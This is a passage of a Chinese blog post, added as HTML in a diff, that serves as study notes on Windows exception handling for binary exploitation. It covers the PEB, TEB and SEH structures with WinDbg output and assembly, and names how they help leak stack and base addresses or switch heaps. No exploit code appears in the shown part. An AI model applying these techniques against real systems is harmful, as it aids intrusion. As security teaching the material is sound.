@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="henry">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/05/17/windows-异常处理/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Windows 异常处理win常见结构理论部分大多来自下面sky师傅的链接，这里仅作为学习笔记（侵删），对这些机制有了解的师傅可以直接参考例题部分，讲解较为详细。  source: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45323960&#x2F;article&#x2F;details&#x2F;131312600   PEBPEB（Process Environment Block）是 Windows 操作系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 异常处理 &amp; 例题">
+<meta property="og:url" content="http://example.com/2024/05/17/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Windows 异常处理win常见结构理论部分大多来自下面sky师傅的链接，这里仅作为学习笔记（侵删），对这些机制有了解的师傅可以直接参考例题部分，讲解较为详细。  source: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45323960&#x2F;article&#x2F;details&#x2F;131312600   PEBPEB（Process Environment Block）是 Windows 操作系统">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-16_21-59-38.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_11-15-09.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_11-15-10.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_11-25-42.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_11-30-47.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_16-48-07.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_16-51-39.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_16-55-38.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-04-37.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-07-20.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-13-47.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-15-26.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-19-13.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-20-24.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-25-13.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-25-14.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_17-37-03.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_21-25-45.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_21-30-40.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_21-35-15.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_21-46-13.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-05-17_21-47-46.png">
+<meta property="article:published_time" content="2024-05-17T13:49:21.464Z">
+<meta property="article:modified_time" content="2024-05-17T13:57:14.900Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="windows，winpwn，stack，gs，SEHOP">
+<meta property="article:tag" content="SEH">
+<meta property="article:tag" content="SafeSEH">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2024-05-16_21-59-38.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/icon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Windows 异常处理 &amp; 例题 -
+        
+        Henry Martin
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Henry Martin
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/links/">LINKS
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-regular fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/links/">LINKS</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Windows 异常处理 &amp; 例题</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/henry.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-05-17 21:49:21</span>
+        <span class="mobile">2024-05-17 21:49:21</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-05-17 21:57:14</span>
+            <span class="mobile">2024-05-17 21:57:14</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Windows/">Windows</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Windows/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/windows%EF%BC%8Cwinpwn%EF%BC%8Cstack%EF%BC%8Cgs%EF%BC%8CSEHOP/">windows，winpwn，stack，gs，SEHOP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SEH/">SEH</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SafeSEH/">SafeSEH</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Windows-异常处理"><a href="#Windows-异常处理" class="headerlink" title="Windows 异常处理"></a>Windows 异常处理</h1><h2 id="win常见结构"><a href="#win常见结构" class="headerlink" title="win常见结构"></a>win常见结构</h2><p>理论部分大多来自下面sky师傅的链接，这里仅作为学习笔记（侵删），对这些机制有了解的师傅可以直接参考例题部分，讲解较为详细。</p>
+<blockquote>
+<p>source: <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45323960/article/details/131312600" >https://blog.csdn.net/qq_45323960/article/details/131312600 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>PEB（Process Environment Block）是 Windows 操作系统中的一个数据结构，它<strong>包含了进程的上下文信息</strong>。每个进程都<strong>有一个唯一的 PEB</strong>，它被<strong>存储在进程的用户模式地址空间</strong>中。<br><strong>PEB 与 TEB 的相对偏移固定</strong>，使用 <code>.process</code> 或者 <code>r $peb</code> 查看进程的 <strong>PEB 地址</strong>，随后使用 <code>dt _PEB peb_addr </code>查看进程的 <strong>PEB 信息</strong>。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; .process</span><br><span class="line">Implicit process is now 00995000</span><br><span class="line">0:000&gt; r $peb</span><br><span class="line">$peb=00995000</span><br><span class="line">0:000&gt; dt _PEB 00995000</span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +0x000 InheritedAddressSpace : 0 &#x27;&#x27;</span><br><span class="line">   +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27;</span><br><span class="line">   +0x002 BeingDebugged    : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x003 BitField         : 0x4 &#x27;&#x27;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure></div>
+
+<p><code>!peb</code> 查看 PEB 的具体内容，其中 Ldr 的地址为76facb00，即 <code>ntdll!pebldr</code> 地址。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !peb</span><br><span class="line">PEB at 00995000</span><br><span class="line">    InheritedAddressSpace:    No</span><br><span class="line">    ReadImageFileExecOptions: No</span><br><span class="line">    BeingDebugged:            Yes</span><br><span class="line">    ImageBaseAddress:         00700000</span><br><span class="line">    NtGlobalFlag:             0</span><br><span class="line">    NtGlobalFlag2:            0</span><br><span class="line">    Ldr                       76facb00</span><br><span class="line">    ...</span><br><span class="line">0:000&gt; dc ntdll!pebldr</span><br><span class="line">76facb00  00000030 00000001 00000000 00e12360  0...........`#..</span><br><span class="line">76facb10  00e18418 00e12368 00e18420 00e12278  ....h#.. ...x&quot;..</span><br><span class="line">76facb20  00e182d0 00000000 00000000 00000000  ................</span><br><span class="line">76facb30  00000002 00000000 00000000 00000000  ................</span><br><span class="line">76facb40  00000000 00000000 00000000 00000000  ................</span><br><span class="line">76facb50  00000000 00000000 00000000 00000000  ................</span><br><span class="line">76facb60  00000000 00000000 00000000 00000000  ................</span><br><span class="line">76facb70  00000000 00000000 00000000 00000000  ................</span><br></pre></td></tr></table></figure></div>
+
+<p>PEB 结构在 Windows Pwn 中的作用主要是<strong>泄露 TEB 地址</strong>，<strong>程序基址</strong>，以及通过修改其中的 <code>ProcessHeap</code> 完成对进程<strong>默认堆的切换</strong>。</p>
+<h3 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h3><p>TEB（Thread Environment Block）是 Windows 操作系统中的一个<strong>线程私有的数据结构</strong>，用于<strong>存储线程相关的信息</strong>。每个线程都有一个对应的 TEB 。32 位程序 <strong>FS 寄存器指向当前线程的 TEB</strong> ，64 位程序 <strong>GS 寄存器指向当前线程的 TEB</strong> 。</p>
+<p>使用 <code>r $teb</code> 查看进程的 TEB 地址，<code>!teb</code> 可以查看 TEB 详细信息。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r $teb</span><br><span class="line">$teb=00998000</span><br><span class="line">0:000&gt; !teb</span><br><span class="line">TEB at 00998000</span><br><span class="line">    ExceptionList:        00affcf0</span><br><span class="line">    StackBase:            00b00000</span><br><span class="line">    StackLimit:           00afd000</span><br><span class="line">    SubSystemTib:         00000000</span><br><span class="line">    FiberData:            00001e00</span><br><span class="line">    ArbitraryUserPointer: 00000000</span><br><span class="line">    Self:                 00998000</span><br><span class="line">    EnvironmentPointer:   00000000</span><br><span class="line">    ClientId:             00003638 . 00000ae0</span><br><span class="line">    RpcHandle:            00000000</span><br><span class="line">    Tls Storage:          00e1acb8</span><br><span class="line">    PEB Address:          00995000</span><br><span class="line">    LastErrorValue:       0</span><br><span class="line">    LastStatusValue:      0</span><br><span class="line">    Count Owned Locks:    0</span><br><span class="line">    HardErrorMode:        0</span><br></pre></td></tr></table></figure></div>
+
+<p>TEB 的开头是一个 <code>NT_TIB</code> 结构，具体如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _nt_tib</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 StackBase        : Ptr32 Void</span><br><span class="line">   +0x008 StackLimit       : Ptr32 Void</span><br><span class="line">   +0x00c SubSystemTib     : Ptr32 Void</span><br><span class="line">   +0x010 FiberData        : Ptr32 Void</span><br><span class="line">   +0x010 Version          : Uint4B</span><br><span class="line">   +0x014 ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +0x018 Self             : Ptr32 _NT_TIB</span><br></pre></td></tr></table></figure></div>
+
+<p>TEB 结构在 Windows Pwn 中的<strong>作用是泄露栈地址</strong>。</p>
+<p>NT_TIB 中一些重要的字段的解释：</p>
+<p><code>ExceptionList</code>：指向当前线程的<strong>异常处理器链表的头部</strong>。当线程发生异常时，系统会将异常处理器添加到该链表中，以便进行异常处理。<br><code>StackBase</code> 和 <code>StackLimit</code>：分别指向<strong>线程栈的起始地址和结束地址</strong>。这是我们我们泄露栈基址的一个途径。<br><code>Self</code>：<strong>指向当前 TEB 的指针</strong>。对于任何 TEB，该字段的值应该等于 TEB 的地址。</p>
+<h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>SEH（Structured Exception Handling，<strong>结构化异常处理</strong>）是 Windows 操作系统中的一种异常处理机制。</p>
+<p><strong>异常处理需要注册异常</strong>，即在异常处理链表中添加 <code>_EXCEPTION_REGISTRATION_RECORD</code> 节点，代码如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push offset SEHandler</span><br><span class="line">push fs:[0]</span><br><span class="line">mov fs:[0], esp</span><br></pre></td></tr></table></figure></div>
+
+<p>如果程序当前的函数执行完毕需要<strong>卸载当前函数中注册的 SEH 处理程序</strong>，代码如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, dword ptr fs:[0]</span><br><span class="line">pop dword ptr fs:[0]</span><br></pre></td></tr></table></figure></div>
+
+<p><code>_EXCEPTION_REGISTRATION_RECORD</code> 中的 <code>Next</code> 指向上一个 <code>_EXCEPTION_REGISTRATION_RECORD</code> 结构，<code>Handler</code> 指向异常处理的代码。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-16_21-59-38.png"
+                      alt="nipaste_2024-05-16_21-59-3"
+                ></p>
+<p>MSC 在 32 位模式对异常处理链表的节点 <code>_EXCEPTION_REGISTRATION_RECORD</code> 被扩充为 <code>CPPEH_RECORD</code> （具体与编译器版本有关），其成员 <code>_EH3_EXCEPTION_REGISTRATION</code> 结构是对<strong>原始的 SEH 结构</strong> <code>_EXCEPTION_REGISTRATION_RECORD</code> 的<strong>扩充。</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> EnclosingLevel;</span><br><span class="line">    <span class="type">void</span> *FilterFunc;</span><br><span class="line">    <span class="type">void</span> *HandlerFunc;</span><br><span class="line">&#125; *PSCOPETABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">    DWORD GSCookieOffset;</span><br><span class="line">    DWORD GSCookieXOROffset;</span><br><span class="line">    DWORD EHCookieOffset;</span><br><span class="line">    DWORD EHCookieXOROffset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> <span class="title">ScopeRecord</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span> *<span class="title">Next</span>;</span></span><br><span class="line">    PVOID ExceptionHandler;</span><br><span class="line">    PSCOPETABLE_ENTRY ScopeTable;</span><br><span class="line">    DWORD TryLevel;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CPPEH_RECORD</span> &#123;</span></span><br><span class="line">    DWORD old_esp;</span><br><span class="line">    EXCEPTION_POINTERS *exc_ptr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span> <span class="title">registration</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>MSC编译器引入了<code>_try</code> 、<code>_except</code> 、<code>_finally</code> 关 完成异常处理，使用方法如下：</p>
